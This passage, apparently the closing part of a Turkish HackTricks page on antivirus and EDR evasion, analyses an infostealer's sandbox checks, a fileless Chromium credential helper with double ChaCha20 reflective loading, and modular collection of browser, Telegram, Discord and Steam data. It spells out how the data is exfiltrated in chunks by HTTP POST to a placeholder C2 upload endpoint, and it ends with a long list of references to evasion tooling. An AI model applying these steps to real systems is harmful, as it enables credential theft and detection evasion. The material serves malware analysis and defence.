- B varyantı sistem özelliklerini inceler (asgari süreç sayısı, yakın zamandaki çalışma süresi), VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve tek adımlı yürütmeyi belirlemek için uyku aralıklarının çevresinde zamanlama kontrolleri gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Fileless yardımcı + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak eşlenen bir Chromium kimlik bilgisi yardımcısı içerir; fileless modda içe aktarımları/relocation’ları kendisi çözümler, böylece yardımcı dosyalar diske yazılmaz.
- Bu yardımcı, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki adet 32 baytlık anahtar + 12 baytlık nonce). Her iki şifre çözme işleminden sonra blob’u reflective olarak yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına enjeksiyon yapmak, AppBound Encryption anahtarlarını devralmak ve ABE güçlendirmelerine rağmen SQLite veritabanlarından parolaları/çerezleri/kredi kartlarını doğrudan çözmek için direct-syscall reflective process hollowing kullanır.


### Modüler bellek içi toplama ve parçalı HTTP sızdırma

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu dolaşır ve etkin modül başına bir thread başlatır (Telegram, Discord, Steam, ekran görüntüleri, belgeler, tarayıcı eklentileri vb.). Her thread sonuçları paylaşılan arabellekler içine yazar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında, her şey statik olarak bağlanmış `miniz` kütüphanesiyle `%TEMP%\\Log.zip` olarak zip’lenir. Ardından `ThreadPayload1` 15 saniye uyur ve arşivi, tarayıcı `multipart/form-data` sınırını (`----WebKitFormBoundary***`) taklit ederek HTTP POST üzerinden `http://<C2>:6767/upload` adresine 10 MB’lık parçalar halinde aktarır. Her parçaya `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı olarak `w: <campaign_tag>` eklenir; son parçaya ise C2’nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Çağrı yığınları: malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – belgeler](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – çağrı yığını spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni enfeksiyon zinciri ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Zero trust’ınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell’den önce: Storm-2603’ün önceki ransomware operasyonlarını inceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Export’ları kötüye kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU başvurusu (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL başlatıcısı](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR’lara karşı koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Klasör yönlendirme tekniğiyle Windows Defender’ın koruyucu kabuğunu kırma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut başvurusu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Saf perdenin ardında: RAT’ten builder’a, oradan coder’a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption şifre çözme](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware’ini etkisiz hale getirme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uyuyan Güzel: Crystal Palace ile Adaptix’i uyutmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Süreç parametresi zehirleme](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uyuyan Güzel II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW’nizi gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop’ı kötüye kullanma: Uygulamalı bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender’ın Remediation Driver’ını kernel işlem ilkeli olarak silahlandırma](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo eşlikçi kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak kendi kendini maskeleyen fonksiyonlar oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe işlevi](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yönlendirilmiş girdi ve çıktı ile alt süreç oluşturma](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge ile C# araçlarını yeniden biçimlendirme](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET projelerini derleme](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept ve kaynak kodu](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcode içermeyen DLL injection için thread pool iç işleyişini kötüye kullanma](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark veri kümesi ve thrember araçları](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Red team implantlarını değerlendirmek için EMBER2024 kullanımı](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning tabanlı tespitlerden kaçınma](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML tabanlı .NET yükleme framework’ü](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan yöntemi](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
